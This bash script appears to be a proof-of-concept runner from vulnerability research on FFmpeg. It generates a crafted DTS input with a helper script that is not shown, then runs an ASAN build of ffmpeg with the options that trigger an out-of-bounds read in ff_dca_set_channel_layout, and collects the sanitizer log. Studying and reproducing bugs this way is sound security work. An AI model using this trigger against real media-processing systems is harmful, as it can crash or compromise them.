#!/bin/bash
# PoC runner for VULN 002: OOB Read on dca2wav[] in ff_dca_set_channel_layout
set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
RESULT=vuln_002_result.txt

# Generate the crafted input
python3 vuln_002_gen.py

# Run ffmpeg with ASAN (abort_on_error=0 lets it log and continue)
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_002.log" \
  "$BIN" -f dts -channel_order coded -i vuln_002_input.dca -f null - > "$RESULT" 2>&1 || true

# Append ASAN log if produced
for f in asan_002.log.*; do
    [ -f "$f" ] && { echo "=== $f ==="; cat "$f"; } >> "$RESULT" 2>/dev/null
done
true
